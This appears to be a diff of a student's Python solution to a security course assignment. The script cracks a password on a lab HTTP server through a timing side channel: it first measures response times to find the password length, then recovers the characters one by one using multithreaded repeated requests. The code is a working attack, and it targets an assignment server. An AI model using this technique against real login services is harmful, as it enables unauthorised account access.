@@ -1,13 +1,13 @@
 import http.client
 import urllib.parse
 import time
-import io
-import subprocess
 from concurrent.futures import ThreadPoolExecutor
+from ThreadSafeCounter import ThreadSafeTimeTracker
+from decimal import Decimal, getcontext
 
 ### --- Global Variables --- ###
 
-DIFFICULTY = 5
+DIFFICULTY = 1
 
 BASE_URL = "aoi-assignment1.oy.ne.ro"
 SERVER_PORT = 8080
@@ -16,10 +16,12 @@ CHARSET = "abcdefghijklmnopqrstuvwxyz"
 
 USERNAME = "326529229" # need to recieve
 
-NUMBER_OF_THREADS = 26
+NUMBER_OF_THREADS = 13
 
 PASSWORD = ""
 LENGTH = -1
+
+getcontext().prec = 30
 
 ### ------------------------- ###
 
@@ -34,7 +36,7 @@ def split_charset():
     parts = [CHARSET[i:i+per_thread] for i in range(0, len(CHARSET), per_thread)]
     return parts
 
-
+### ------------------------- ###
 
 def try_pass(password):
     """
@@ -58,17 +60,19 @@ def try_pass(password):
     start = time.perf_counter_ns()
     conn.request("GET", path)
     response = conn.getresponse()
-    delta = time.perf_counter_ns() - start
+    delta = Decimal(time.perf_counter_ns()) - Decimal(start)
 
     data = response.read()
     conn.close()
     return {"Status": response.status, "Reason": response.reason, "Time": delta, "Data": data}
 
 
-
+### ------------------------- ###
 
 
 def crack_password_length():
+    # to warm up the connection
+    try_pass("!")
     maxTime = 0
     length=-1
     for l in range(33):
@@ -79,61 +83,59 @@ def crack_password_length():
     return length
 
 
+### ------------------------- ###
+
+def num_repetitions(discovered_length):
+    """
+    this function returns the number of repetitions needed for each char
+    """
+    global LENGTH
+    return int(discovered_length/2) + 2
 
 
-
-def crack_next_char(discovered_length):
+def crack_next_char(discovered_length, executor):
     global NUMBER_OF_THREADS
-    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
-        parts = split_charset()
-        results = []
-        maxTime=0
-        maxChar=''
+    counter = ThreadSafeTimeTracker()
+    parts = split_charset()
+    for i in range(num_repetitions(discovered_length)):
+        futures = []
         for part in parts:
-            future = executor.submit(worker, part, discovered_length)
-            results.append(future)
-        for future in results:
-            char, time = future.result()
-            if time > maxTime:
-                maxTime = time
-                maxChar = char
-    return maxChar
-
-
-def worker(chars, discovered_length):
-    global PASSWORD, LENGTH
-    maxTime=0
-    maxChar=''
-    for char in chars:
-        result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
-        if result.get("Time") > maxTime:
-            maxTime = result.get("Time")
-            maxChar = char
-    return (maxChar, maxTime)
-
-
+            futures.append(executor.submit(worker, part, discovered_length, counter))
+        # Wait for all threads to complete
+        for future in futures:
+            future.result()
+    return counter.get_max_letter()
     
 
-def main():
+
+def worker(chars, discovered_length, counter):
     global PASSWORD, LENGTH
     # to warm up the connection
     try_pass("!")
+    for char in chars:
+        result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
+        counter.record_time(char, result.get("Time"))
+
+
+### ------------------------- ###
+
+def main():
+    global PASSWORD, LENGTH
+    start = time.process_time()
     # first step - exploit the server's length validation
     LENGTH = crack_password_length()
     print(f"Password length: {LENGTH}")
     # second step - crack the password char by char
     discovered_length = 0
-    while len(PASSWORD) < LENGTH:
-        PASSWORD += crack_next_char(discovered_length)
-        discovered_length += 1
-        print(f"Password so far: {PASSWORD}")
-        
-    check = try_pass(PASSWORD).get("Data")    
-    if check == b'1':
-        print(f"Password found: {PASSWORD}")
-    else:
-        print("Password not found")
-    
+    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
+        while len(PASSWORD) < LENGTH:
+            PASSWORD += crack_next_char(discovered_length, executor)
+            discovered_length += 1
+            print(f"Password so far: {PASSWORD}")
+    end = time.process_time()
+    print("-------------------")
+    print(try_pass(PASSWORD))
+    print(f"total time took: {end-start}")
         
 
 if __name__ == '__main__':
